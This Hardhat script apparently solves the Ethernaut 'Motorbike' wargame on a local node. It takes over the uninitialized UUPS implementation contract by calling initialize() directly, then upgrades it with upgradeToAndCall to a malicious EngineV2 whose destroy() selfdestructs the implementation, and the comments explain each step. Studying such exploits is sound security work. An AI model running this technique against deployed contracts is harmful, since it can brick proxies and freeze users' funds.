import { ethers } from "hardhat";

//Fit player and admin addresses chosen from hardhat node addresses 
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const deployer = "0x2546bcd3c84621e976d8185a91a922ae77ecec30";

async function main() {

const signer = await ethers.getSigner(deployer);

const implementationFactory = await ethers.getContractFactory("Engine", signer);
const implementation = await implementationFactory.deploy();
const proxyFactory = await ethers.getContractFactory("Motorbike",signer);
const proxy = await proxyFactory.deploy(implementation.address)
const proxiedEngine = await implementationFactory.attach(proxy.address)

const implementationV2Factory = await ethers.getContractFactory("EngineV2", signer);
const implementationV2 = await implementationV2Factory.deploy();


//HACK STEPS (Destruct Engine contract)
//UUPS proxy pattern. As proxy keeps the data (storage) and impl keeps the logic, all storage 
//variables after initialization are stored in proxy context. The logic contract can be called directly
//to trick the requirement for upgrading afterwards with the upgrader address. Setting up a 
// EngineV2 malicious contract and encoding the destructive call within will do the rest. 
//_upgradeToAndCall delegates a call to the given new implementation address with provided data param. 
//Since delegatecall is context preserving, the selfdestruct of destroy method
//would run in context of Engine. Thus Engine is destroyed.

// 1. Check the starting values
console.log("Engine deployed at address:",  implementation.address)
console.log("Proxy deployed at address:",  proxy.address)
console.log("EngineV2 deployed at address:",  implementationV2.address)
console.log("Engine's upgrader:",  await proxiedEngine.upgrader())
console.log("-----------------")

// 2. Set upgrader in implementation context
const player = await ethers.getSigner(PLAYER_ADDRESS)
await implementation.connect(player).initialize();
console.log("Engine's upgrader is now (proxy context):", await proxiedEngine.upgrader())
console.log("Engine's upgrader is now (implementation context):", await implementation.upgrader())

// 3. Encode EngineV2 function to trigger selfdestruct after impl update
const ABIV2 = ["function destroy()"];
const ifaceV2 = new ethers.utils.Interface(ABIV2);
const calldataV2 = ifaceV2.encodeFunctionData("destroy", []);
console.log("Destroy func signature:", calldataV2)

// 4. Upgrade implementation and check after tx
console.log("Engine contract code check: ", await ethers.provider.getCode(implementation.address))
await implementation.connect(player).upgradeToAndCall(implementationV2.address, calldataV2);
console.log("Engine contract still exists?: ", await ethers.provider.getCode(implementation.address))
}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
